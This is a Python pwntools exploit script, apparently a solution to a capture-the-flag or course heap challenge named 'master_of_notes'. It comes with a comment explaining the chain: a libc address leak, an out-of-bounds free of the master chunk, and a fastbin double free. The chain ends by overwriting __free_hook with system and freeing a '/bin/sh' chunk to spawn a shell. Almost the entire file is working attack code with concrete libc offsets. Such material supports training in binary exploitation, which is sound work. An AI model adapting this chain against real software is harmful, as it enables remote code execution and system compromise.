from pwn import *

#First, I create a user with username "Master of Notes" (this username is necessary because later it has to corresponds
#to the master's one -->strcmp) and log in with it. I create a note without filling it, so I can leak the libc address when
#I print the notes. Then, I create two notes X1 and X2 that will be used later for fastbin attack. I noticed that with delete_note I can
#go out of bounds, so if I write -8 as index I can point to a memory location in BSS with the master's chunk address. I free it.
#Now, I register as master (thanks to LIFO mechanism). I can now start the fastbin attack because master can do a double free
#in delete_note. I free the two notes X1, X2 and again X1. After this, I login as user and I create two notes, filling the first
#with the address of free_hook. This allows me to allocate a chunk and after this, another one can be allocated in the address specified
#in the first note (free_hook). I fill this chunk with the address of system (so when free will be called, it executes system) and the second one with "/bin/sh"
#to have a shell. Finally, I free the chunk with "/bin/sh" and I get the shell.

main_menu = """
    1) Register
    2) User Login
    3) Master Login
    4) Quit
"""
logged_menu = """
    1) Create note.
    2) Fill note.
    3) Print notes.
    4) Delete note.
    5) Log out.
    6) Quit
"""

def register(name, password):
    p.sendline(b'1')
    p.recvuntil(b'Name: ')
    p.sendline(name.encode())
    p.recvuntil(b'Password: ')
    p.sendline(password.encode())
    p.recvuntil(b'> ')

def user_login(name, password):
    p.sendline(b'2')
    p.recvuntil(b'Name: ')
    p.sendline(name.encode())
    p.recvuntil(b'Password: ')
    p.sendline(password.encode())
    p.recvuntil(b'> ')

def create_note(index, size):
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Note size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'> ')

def fill_note(index, content):
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
    p.recvuntil(b'> ')

def print_notes(index, length):
    p.sendline(b'3')
    p.recvuntil(b'Notes:\n')
    if index == 0:
        time.sleep(0.5)
        p.recvuntil(b'Note: ')
        leak = p.read(length).ljust(8, b'\x00')
    else:
        for _ in range(index):
            p.recvuntil(b'\n')
        p.recvuntil(b'Note: ')
        leak = p.read(length).ljust(8, b'\x00')
    p.recvuntil(b'> ')
    return leak

def delete_note(index, is_master, isLast = False):
    if is_master:
        p.sendline(b'2')
    else:
        p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    if not isLast:
        p.recvuntil(b'> ')
def logout(is_master):
    if is_master:
        p.sendline(b'3')
    else:
        p.sendline(b'5')
    p.recvuntil(b'> ')

def master_login(password):
    p.sendline(b'3')
    p.recvuntil(b'Password: ')
    p.sendline(password.encode())
    p.recvuntil(b'> ')

context.arch = "amd64"

p = process("./master_of_notes")
#p = remote("bin.training.offdef.it", 4004)
"""gdb.attach(p, '''
    b fill_note
    c
''')
input("wait")"""

OFFSET_LEAK_LIBC_BASE = 0x3ebca0
OFFSET_SYSTEM_LIBC_BASE = 0x4f440
OFFSET_FREE_HOOK_LIBC_BASE = 0x3ed8e8

#LEAK LIBC
p.recvuntil(b'> ')
register("Master of Notes\x00", "AAAA") #username necessary because it needs to correspond to the master's one
user_login("Master of Notes\x00", "AAAA")
create_note(0, 10)
leak_libc = print_notes(0, 6)
create_note(1, 0x80)
create_note(2, 0x80)
leak_libc_n = u64(leak_libc)
print(hex(leak_libc_n))

#FREE MASTER CHUNK
delete_note(-8, False) #to free the master (delete_note allows to go out of bounds) 
logout(False)

#REGISTER AS MASTER
register("admin\x00", "0000")
master_login("0000")

#FASTBIN ATTACK pt.1 (DOUBLE FREE)
delete_note(1, True)
delete_note(2, True)
delete_note(1, True)
logout(True)

#FASTBIN ATTACK pt.2 (OVERWRITE FREE HOOK WITH SYSTEM)
user_login("Master of Notes\x00", "AAAA")
create_note(1, 0x80)
create_note(2, 0x80)
fill_note(1, p64(leak_libc_n - OFFSET_LEAK_LIBC_BASE + OFFSET_FREE_HOOK_LIBC_BASE))
create_note(3, 0x80)
create_note(4, 0x80) #corresponds to free_hook
fill_note(4, p64(leak_libc_n - OFFSET_LEAK_LIBC_BASE + OFFSET_SYSTEM_LIBC_BASE))
fill_note(2, b"/bin/sh\x00")
delete_note(2, False, True)


p.interactive()